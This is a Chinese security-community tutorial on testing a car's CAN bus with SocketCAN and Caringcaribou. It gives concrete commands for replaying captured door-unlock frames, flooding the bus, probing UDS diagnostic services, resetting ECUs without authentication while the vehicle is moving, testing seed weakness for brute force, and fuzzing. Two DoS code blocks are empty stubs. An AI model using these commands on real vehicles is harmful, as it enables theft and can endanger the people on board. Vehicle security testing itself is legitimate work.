

# 奇安信攻防社区 - 汽车 CAN 总线 -03 测试方法演示

### 汽车 CAN 总线 -03 测试方法演示

“免责声明：本文涉及到的所有技术仅用来学习交流，严禁用于非法用途，未经授权请勿非法渗透。否则产生的一切后果自行承担！一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉，谢谢！”本专题文章将分为三部分：介绍、攻击、演示，本文为终章汽车 CAN 总线测试方法演示。

本演示希望起到一个梳理的作用，希望读者理解每一步的原理，多看标准，不要完全依赖工具。

常用 CAN 收发工具包括很多种，本篇以 socket can 搭配 Caringcaribou 为例展开介绍（socket can 买免驱的，优点便宜、使用方便，Caringcaribou 做 can 简直太好用，但也发现一个问题，缺少扩展帧的 uds 检测，二次开发中，把这个模块补上）

![图片](assets/1704762236-b6ec5d2960019505bc6723a757b08144.png)

### **环境搭建：**

**1.canutils**

1.1 kali 执行如下命令

apt install can-utils

1.2 执行`candump -h`回显如下证明安装成功

![图片](assets/1704762236-936cf9753ffb3b0537edd86c0625303d.png)

**2.Caringcaribou**

2.1 执行如下命令进行安装

# 下载 Caringcaribou

git clone [https://github.com/CaringCaribou/caringcaribou.git](https://github.com/CaringCaribou/caringcaribou.git)

# 到文件目录执行安装程序

cd caringcaribou  
python3 setup.py install

\# 安装 python can 库  
pip3 install python-can

### **演示**

### **重放攻击**

1.1 candump 监听 Can 总线数据（此处是破线接入车辆 can 网络）

`candump can0 -l`

1.2 按动车钥匙中的开锁按钮

![图片](assets/1704762236-9cd3d11e23314f2672baa061b180365e.png)

1.3 停止抓包并对抓到的数据进行处理

`cat candump.log | awk '{print $3}' > res.txt`

1.4 利用 Caringcaribou 工具进行重放攻击

`cc.py fuzzer identify res.txt`

1.5 根据汽车是否出现对应反应选择 y/n, 获取开关车门数据包

![图片](assets/1704762236-1ccc9d1170978705ac04387e2297e95b.png)

1.6 对开关车门数据包进行重放

`cansend can0 100#3d157d40d9000560`

观察到车锁成功被开启

![图片](assets/1704762236-9cd3d11e23314f2672baa061b180365e.png)

再重放一次数据包，发现车锁成功关闭

![图片](assets/1704762236-9cd3d11e23314f2672baa061b180365e.png)

### **DoS 攻击**

### **（1）过载 Dos 攻击**

此处使用 CANoe 实现过载 DOS 攻击

代码如下

```php
variables
```

**（2）优先级 Dos 攻击**

编写 shell 脚本向 can 总线发送 10000 条垃圾数据

`vim dos.sh`

写入如下内容

```php
#!/bin/bash
```

运行该 shell 脚本

chmod +x dos.sh  
./dos.sh

### **UDS 探测**

通过 OBD 接口连接车辆 Can 总线，对 Can 总线进行抓包尝试

![图片](assets/1704762236-8bdfd4e887c4d12707fdb50480ee25cc.png)

`candump can0`

![图片](assets/1704762236-24accc2ae268a5b7f7dabf00b3ae50d9.png)

未获取到数据，说明网关对 Can 总线和 OBD 接口进行了隔离，无法直接抓到 Can 报文

向 Can 总线发送 UDS 诊断请求，回显正常，说明 Can 总线工作正常

**方法一：**

**UDS 服务扫描**

`cc.py uds discovery`

![图片](assets/1704762236-3c41b374d90d3d8d02486528353b5335.png)

**探测支持的服务 ID**

`cc.py uds services src ds`

`cc.py uds services 0x607 0x608`

进行服务探测，发现 0x27,0x29 服务均存在

![图片](assets/1704762236-1205d061b6d0fa8a2209ca2b1a0af8bb.png)

尝试进行重置 ECU，读取任意 did 等操作，发现并没有鉴权

`cc.py uds dump_dids 0x607 0x608`

![图片](assets/1704762236-d120944fdd8088abf84a7868893d64f6.png)

切换至扩展会话模式

`cansend can0 607#0210030000000000`

在车辆行驶的过程中向车辆发送

**发送重置 ecu 请求，** 多次发送可以发现 Ecu 无限制重置

`cc.py uds ecu_reset 2 clientid serverid`

![图片](assets/1704762236-3212788d1c03f8b874d82f7b4fb591ee.png)

**27 服务安全性**

切换至编程模式

`cansend can0 607#0210020000000000`

多次请求安全种子，观察种子强度和重复

`cansend can0 607#0227010000000000`

**方法二：**

使用 caringcaribou 工具 auto 模块

自动化探测 uds 主要攻击面（但不适用扩展帧的 uds 检测，二次开发中）

```php
cc.py uds auto
```

**\*\*27 服务安全性**  
\*\*

探测 27 服务种子强度和重复问题

```php
cc.py uds_fuzz seed_randomness_fuzzer 100311022701 0x733 0x633
```

种子重复且种子为 8 位，但前 5 位一致，有效位只为 3 位，可爆破种子，

![图片](assets/1704762236-f07b7d03cc473db7b58608e352af5139.png)

## **模糊测试**

1.1 candump 监听 Can 总线

`candump can0 -l`

1.2 使用 Caringcaribou 向 Can 总线发送随机消息

`cc.py fuzzer random`

![图片](assets/1704762236-98dbaec36c0dabd41982e19cd02a0e09.png)

1.3 随时观察车辆是否发生异常现象，若发生，则停止 candump 监听，对数据进行处理

`cat candump.log | awk '{print $3}' > res.txt`

1.4 使用 Caringcaribou 进行重放以确认引起问题的数据包

`cc.py fuzzer identify res.txt`

![图片](assets/1704762236-ab807455aeec15e94009a99797b3a385.png)

产品预告

基于 caringcaribou 二次开发

适用扩展帧的 uds 检测

![图片](assets/1704762236-0b93d74970630fd45985f52d50776091.png)
